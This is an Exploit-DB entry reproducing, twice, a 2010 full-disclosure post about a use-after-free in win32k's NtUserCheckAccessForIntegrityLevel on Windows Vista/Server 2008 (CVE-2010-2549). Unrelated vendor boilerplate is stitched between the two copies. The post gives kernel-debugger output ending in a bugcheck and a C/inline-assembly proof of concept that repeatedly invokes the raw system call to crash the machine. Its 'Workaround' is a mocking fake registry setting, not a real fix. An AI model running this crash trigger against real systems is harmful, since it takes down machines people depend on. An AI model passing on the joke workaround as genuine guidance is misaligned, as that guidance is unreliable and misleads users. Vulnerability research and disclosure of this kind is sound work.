# Microsoft Windows Vista/2008 - NtUserCheckAccessForIntegrityLevel Use-After-Free

#### EDB-ID:

###### 14156

#### CVE:

###### [2010-2549](https://nvd.nist.gov/vuln/detail/CVE-2010-2549)

#### Author:

###### [MSRC](/?author=2715)

**Vulnerable App:**

```
Windows Vista/Server 2008 NtUserCheckAccessForIntegrityLevel Use-after-free Vulnerability

Intro:

Due to hostility toward security researchers, the most recent example being of Tavis Ormandy, a number of us from the industry (and some not from the industry) have come together to form MSRC: the Microsoft-Spurned Researcher Collective.  MSRC will fully disclose vulnerability information discovered in our free time, free from retaliation against us or any inferred employer.

Vulnerability report:

win32k!NtUserCheckAccessForIntegrityLevel in Vista/Server 2008 calls LockProcessByClientId() on the specified ClientID. When this call fails, the refcount will be first decremented by nt!ObfDereferenceObject and then by win32k!NtUserCheckAccessForIntegrityLevel again, resulting in a refcount leak.  The refcount leak can be abused to have an in-use process object deleted. (use-after-free)

Some debugging info:

kd> vertarget
Windows Server 2008 Kernel Version 6002 (SP2)
kd> LM m win32k
start    end        module name
8d460000 8d663000   win32k
kd> BA e 1 8d58d710 \"dt nt!_OBJECT_HEADER @edx PointerCount; g\"
kd> g
   +0x000 PointerCount : 145
   +0x000 PointerCount : 144
   +0x000 PointerCount : 143
...
   +0x000 PointerCount : 3
   +0x000 PointerCount : 2
   +0x000 PointerCount : 1
*** Fatal System Error: 0x00000018
kd> kc
nt!KeBugCheck2
nt!ObfDereferenceObject
win32k!NtUserCheckAccessForIntegrityLevel
nt!KiFastCallEntry

The vulnerability can be triggered in one line below, where 4 is just the PID of PsInitialSystemProcess.

while (1) NtUserCheckAccessForIntegrityLevel(4, 0, NULL);

Since there's no exported stub for this system call, you'll have to craft the call manually. sysenter is your friend.

http://j00ru.vexillium.org/win32k_syscalls/

POC:
#include <windows.h>
#define LEAK_ME 0x1151
int main(int argc, char *argv[])
{
    /* get us some win32k! */
    LoadLibrary("user32");
    while (1) {
        __asm {
           mov eax, LEAK_ME
           push 0
           push 0
           push 4
           lea edx, dword ptr [esp]
           int 0x2e
        }
     }
}

Workaround:

Microsoft can workaround these advisories by locating the following registry key: HKCU\\Microsoft\\Windows\\CurrentVersion\\Security and changing the "OurJob" boolean value to FALSE.

We at MSRC would like to help you, the users, work around this issue, but PatchGuard will not allow us ;-(

Current MSRC Members (alphabetical order!):
XX XXXXXX
XXXX XXXXXXXX
XXXXX XXX
XXXXXXX XXXXXXX
XXXXXX XXXXXXXXX
XXXXX XXXXXXXX

If you wish to responsibly disclose a vulnerability through full disclosure or want to join our team, fire off an email to: msrc-disclosure () hushmail com

We do have a vetting process by the way, for any Microsoft employees trying to join ;-)

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

# MSRC-001: Windows Vista/Server 2008 NtUserCheckAccessForIntegrityLevel Use-after-free Vulnerability

---

*From*: msrc-disclosure () hushmail com

*Date*: Wed, 30 Jun 2010 23:46:32 +0000

---

```
Windows Vista/Server 2008 NtUserCheckAccessForIntegrityLevel Use-
after-free Vulnerability

Intro:

Due to hostility toward security researchers, the most recent
example being of Tavis Ormandy, a number of us from the industry
(and some not from the industry) have come together to form MSRC:
the Microsoft-Spurned Researcher Collective.  MSRC will fully
disclose vulnerability information discovered in our free time,
free from retaliation against us or any inferred employer.

Vulnerability report:

win32k!NtUserCheckAccessForIntegrityLevel in Vista/Server 2008
calls LockProcessByClientId() on the specified ClientID. When this
call fails, the refcount will be first decremented by
nt!ObfDereferenceObject and then by
win32k!NtUserCheckAccessForIntegrityLevel again, resulting in a
refcount leak.  The refcount leak can be abused to have an in-use
process object deleted. (use-after-free)

Some debugging info:

kd> vertarget
Windows Server 2008 Kernel Version 6002 (SP2)
kd> LM m win32k
start    end        module name
8d460000 8d663000   win32k
kd> BA e 1 8d58d710 "dt nt!_OBJECT_HEADER @edx PointerCount; g"
kd> g
   +0x000 PointerCount : 145
   +0x000 PointerCount : 144
   +0x000 PointerCount : 143
...
   +0x000 PointerCount : 3
   +0x000 PointerCount : 2
   +0x000 PointerCount : 1
*** Fatal System Error: 0x00000018
kd> kc
nt!KeBugCheck2
nt!ObfDereferenceObject
win32k!NtUserCheckAccessForIntegrityLevel
nt!KiFastCallEntry

The vulnerability can be triggered in one line below, where 4 is
just the PID of PsInitialSystemProcess.

while (1) NtUserCheckAccessForIntegrityLevel(4, 0, NULL);

Since there's no exported stub for this system call, you'll have to
craft the call manually. sysenter is your friend.

<http://j00ru.vexillium.org/win32k_syscalls/>

POC:
#include <windows.h>
#define LEAK_ME 0x1151
int main(int argc, char *argv[])
{
    /* get us some win32k! */
    LoadLibrary("user32");
    while (1) {
        __asm {
           mov eax, LEAK_ME
           push 0
           push 0
           push 4
           lea edx, dword ptr [esp]
           int 0x2e
        }
     }
}

Workaround:

Microsoft can workaround these advisories by locating the following
registry key: HKCU\Microsoft\Windows\CurrentVersion\Security and
changing the "OurJob" boolean value to FALSE.

We at MSRC would like to help you, the users, work around this
issue, but PatchGuard will not allow us ;-(

Current MSRC Members (alphabetical order!):
XX XXXXXX
XXXX XXXXXXXX
XXXXX XXX
XXXXXXX XXXXXXX
XXXXXX XXXXXXXXX
XXXXX XXXXXXXX

If you wish to responsibly disclose a vulnerability through full
disclosure or want to join our team, fire off an email to: msrc-
disclosure () hushmail com

We do have a vetting process by the way, for any Microsoft
employees trying to join ;-)
